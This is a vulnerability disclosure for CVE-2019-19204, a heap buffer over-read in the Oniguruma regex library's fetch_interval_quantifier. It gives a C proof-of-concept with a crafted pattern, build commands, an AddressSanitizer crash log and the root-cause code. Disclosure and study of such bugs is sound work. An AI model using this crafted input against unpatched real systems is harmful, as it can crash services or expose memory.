# CVE-2019-19204
An issue was discovered in Oniguruma 6.x before 6.9.4_rc2. In the function fetch_interval_quantifier (formerly known as fetch_range_quantifier) in regparse.c, PFETCH is called without checking PEND. This leads to a heap-based buffer over-read.
Researcher: **ManhND of The Tarantula Team, VinCSS (a member of Vingroup)**

## What is Oniguruma
Oniguruma by K. Kosako is a BSD licensed regular expression library that supports a variety of character encodings. The Ruby programming language, in version 1.9, as well as PHP's multi-byte string module (since PHP5), use Oniguruma as their regular expression engine. It is also used in products such as Atom, GyazMail Take Command Console, Tera Term, TextMate, Sublime Text and SubEthaEdit.

## Proof of Concept
Source code:
```C
#include <stdlib.h>
#include <string.h>
#include "oniguruma.h"

int main(int argc, char* argv[])
{
  int r;
  regex_t* reg;
  OnigErrorInfo einfo;

  char *pattern = (char*)malloc(6);
  memcpy(pattern, "_\\{21\\", 6);
  char *pattern_end = pattern + 6;
  
  

  OnigEncodingType *enc = ONIG_ENCODING_ASCII;


  onig_initialize(&enc, 1);
  r = onig_new(&reg, (unsigned char *)pattern, (unsigned char *)pattern_end,
               ONIG_OPTION_NONE, enc, ONIG_SYNTAX_GREP, &einfo);
  if (r == ONIG_NORMAL) {
    onig_free(reg);
  }

  onig_end();
  return 0;
}
```
Compilation of Oniguruma and the PoC:
```
./configure CC=gcc CFLAGS="-m32 -O0 -ggdb3 -fsanitize=address" LDFLAGS="-m32 -O0 -ggdb3 -fsanitize=address" && make -j4
gcc -fsanitize=address -O0 -I./oniguruma-gcc-asan/src -ggdb3 poc-fetch_interval_quantifier-2-PFETCH.c ./oniguruma-gcc-asan/src/.libs/libonig.a -o PoC
```
Crash log:
```
root@manh-ubuntu16:~/fuzz/fuzz_oniguruma# ./PoC
=================================================================
==6418==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60200000eff6 at pc 0x00000044cb35 bp 0x7ffde176e0e0 sp 0x7ffde176e0d0
READ of size 1 at 0x60200000eff6 thread T0
    #0 0x44cb34 in onigenc_single_byte_mbc_to_code /root/fuzz/fuzz_oniguruma/oniguruma-gcc-asan/src/regenc.c:704
    #1 0x4683a0 in fetch_interval_quantifier /root/fuzz/fuzz_oniguruma/oniguruma-gcc-asan/src/regparse.c:4182
    #2 0x46e79a in fetch_token /root/fuzz/fuzz_oniguruma/oniguruma-gcc-asan/src/regparse.c:5009
    #3 0x481e9f in parse_exp /root/fuzz/fuzz_oniguruma/oniguruma-gcc-asan/src/regparse.c:7974
    #4 0x483de7 in parse_branch /root/fuzz/fuzz_oniguruma/oniguruma-gcc-asan/src/regparse.c:8303
    #5 0x48431b in parse_alts /root/fuzz/fuzz_oniguruma/oniguruma-gcc-asan/src/regparse.c:8354
    #6 0x484808 in parse_regexp /root/fuzz/fuzz_oniguruma/oniguruma-gcc-asan/src/regparse.c:8413
    #7 0x484db1 in onig_parse_tree /root/fuzz/fuzz_oniguruma/oniguruma-gcc-asan/src/regparse.c:8468
    #8 0x423c6b in onig_compile /root/fuzz/fuzz_oniguruma/oniguruma-gcc-asan/src/regcomp.c:6694
    #9 0x424e53 in onig_new /root/fuzz/fuzz_oniguruma/oniguruma-gcc-asan/src/regcomp.c:6964
    #10 0x401265 in main /root/fuzz/fuzz_oniguruma/poc-fetch_interval_quantifier-2-PFETCH.c:27
    #11 0x7f18b06ad82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)
    #12 0x401048 in _start (/root/fuzz/fuzz_oniguruma/PoC+0x401048)

0x60200000eff6 is located 0 bytes to the right of 6-byte region [0x60200000eff0,0x60200000eff6)
allocated by thread T0 here:
    #0 0x7f18b0aef602 in malloc (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x98602)
    #1 0x4011e2 in main /root/fuzz/fuzz_oniguruma/poc-fetch_interval_quantifier-2-PFETCH.c:17
    #2 0x7f18b06ad82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)

SUMMARY: AddressSanitizer: heap-buffer-overflow /root/fuzz/fuzz_oniguruma/oniguruma-gcc-asan/src/regenc.c:704 onigenc_single_byte_mbc_to_code
Shadow bytes around the buggy address:
  0x0c047fff9da0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff9db0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff9dc0: fa fa 04 fa fa fa 00 00 fa fa 00 04 fa fa 00 00
  0x0c047fff9dd0: fa fa 06 fa fa fa 00 00 fa fa 06 fa fa fa 00 00
  0x0c047fff9de0: fa fa 04 fa fa fa 00 00 fa fa 00 01 fa fa 00 00
=>0x0c047fff9df0: fa fa 00 00 fa fa 05 fa fa fa 00 00 fa fa[06]fa
  0x0c047fff9e00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff9e10: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff9e20: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff9e30: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff9e40: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Heap right redzone:      fb
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack partial redzone:   f4
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
==6418==ABORTING
```
## Root cause
Referenced source code version: **ca7ddbd858dcdc8322d619cf41ab125a2603a0d4**
At regparse.c:4182 in fetch_interval_quantifier, PFETCH is called without checking PEND.
```C
  if (IS_SYNTAX_OP(env->syntax, ONIG_SYN_OP_ESC_BRACE_INTERVAL)) {
    if (c != MC_ESC(env->syntax)) goto invalid;
    PFETCH(c);
  }
```
This leads to heap-buffer-overflow.
